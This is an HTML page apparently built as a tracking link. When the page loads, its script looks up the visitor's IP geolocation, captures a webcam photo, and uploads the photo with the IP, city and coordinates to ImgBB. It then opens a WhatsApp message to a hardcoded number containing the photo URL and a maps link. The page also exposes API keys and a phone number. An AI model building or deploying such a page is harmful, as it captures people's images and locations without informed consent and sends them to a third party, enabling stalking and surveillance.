<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Location & Photo to WhatsApp</title>
</head>
<body>
    <h2>Sending Location & Photo to WhatsApp...</h2>
    <p id="status">Getting location...</p>

    <script>
        // API Key & Configurations
        const IMGBB_API_KEY = "83601732f6095faec5d42577498c1da8";  // ImgBB API Key
        const USER_WHATSAPP = "94713424265";  // WhatsApp Number to send

        // Upload Image to ImgBB with extra IP address info
        async function uploadToImgBB(imageData, ipInfo) {
            try {
                const formData = new FormData();
                formData.append("image", imageData.split(",")[1]);

                // Prepare additional information (IP-related) to be sent
                const description = `Location Information:\nIP: ${ipInfo.ip}\nCity: ${ipInfo.city}\nRegion: ${ipInfo.region}\nCountry: ${ipInfo.country}\nCoordinates: ${ipInfo.loc}`;

                // Upload image along with description
                formData.append("description", description);

                const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                    method: "POST",
                    body: formData
                });

                const data = await response.json();
                if (data.success) {
                    console.log("Image URL:", data.data.url);  // Log the photo URL for debugging
                    return data.data.url;  // Return image URL
                } else {
                    throw new Error("ImgBB upload failed!");
                }
            } catch (error) {
                console.error("ImgBB Error:", error);
                return null;
            }
        }

        // Get Location using IP address from ipinfo.io
        async function getLocationByIP() {
            try {
                const response = await fetch("https://ipinfo.io/json?token=1b000494becc9f");
                const data = await response.json();
                return data; // Return the full IP information including location
            } catch (error) {
                console.error("IP Location Error:", error);
                document.getElementById("status").innerText = "Failed to get location.";
                return null;
            }
        }

        // Capture Photo & Get Location
        async function captureAndSend() {
            try {
                // Get location using IP address
                const ipInfo = await getLocationByIP();
                if (!ipInfo) return;  // If location retrieval failed, stop further execution

                document.getElementById("status").innerText = "Uploading photo...";

                // Capture Photo and Upload to ImgBB
                const photo = await capturePhoto();
                const photoUrl = await uploadToImgBB(photo, ipInfo);

                if (photoUrl) {
                    document.getElementById("status").innerText = "Sending to WhatsApp...";

                    // Create WhatsApp message with the IP info and photo URL
                    const locationMessage = `ðŸ“ My Location: https://www.google.com/maps?q=${ipInfo.loc}`;
                    const photoMessage = `ðŸ“¸ Photo URL: ${photoUrl}`;

                    const encodedMessage = encodeURIComponent(locationMessage + "\n" + photoMessage);

                    // Send WhatsApp message by creating a WhatsApp link
                    window.open(`https://wa.me/${USER_WHATSAPP}?text=${encodedMessage}`, "_blank");
                } else {
                    document.getElementById("status").innerText = "Image upload failed.";
                }

            } catch (error) {
                console.error("Capture or Location Error:", error);
                document.getElementById("status").innerText = "Error: " + error.message;
            }
        }

        // Capture a Photo with reduced resolution for speed
        async function capturePhoto() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } }); // Reduced resolution
            const video = document.createElement("video");
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement("canvas");
            canvas.width = 640;  // Reduced resolution width
            canvas.height = 480; // Reduced resolution height
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());

            return canvas.toDataURL("image/png");
        }

        // Auto-run on page load
        window.onload = captureAndSend;
    </script>
</body>
</html>
